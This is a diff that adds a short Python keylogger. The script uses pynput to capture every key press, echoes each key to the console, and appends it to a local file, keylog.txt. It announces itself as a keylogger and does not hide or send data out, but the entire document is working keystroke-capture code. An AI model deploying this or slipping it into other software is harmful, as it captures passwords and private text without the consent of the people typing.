@@ -1,0 +1,19 @@
+from pynput import keyboard
+
+def keyPressed(key):
+    print(f"Key pressed: {key}")
+    with open("keylog.txt", 'a') as logkey:
+        try:
+            # Try to get character keys
+            logkey.write(key.char)
+        except AttributeError:
+            # Handle special keys (e.g., space, enter, etc.)
+            logkey.write(f' [{key}] ')
+
+if __name__ == "__main__":
+    print("🔐 Keylogger started... Press Ctrl+C to stop.")
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input("Press Enter to stop...\n")
+
+
